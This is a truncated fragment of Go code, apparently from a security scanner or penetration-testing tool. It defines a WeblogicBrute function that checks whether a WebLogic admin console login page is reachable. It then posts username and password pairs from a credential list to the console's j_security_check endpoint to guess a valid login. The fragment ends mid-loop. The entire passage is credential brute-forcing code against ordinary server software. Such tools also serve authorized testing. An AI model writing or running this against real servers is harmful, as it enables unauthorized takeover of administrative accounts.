...
func WeblogicBrute(url string) (username string, password string) {
	if req, err := http.Request(url+"/console/login/LoginForm.jsp", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 {
			for uspa := range weblogicuserpass {
				if req2, err2 := http.Request(url+"/console/j_security_check", "POST", fmt.Sprintf("j_username=%s&j_password=%s", weblogicuserpass[uspa].Username, weblogicuserpass[uspa].Password), true, nil); err2 == nil {
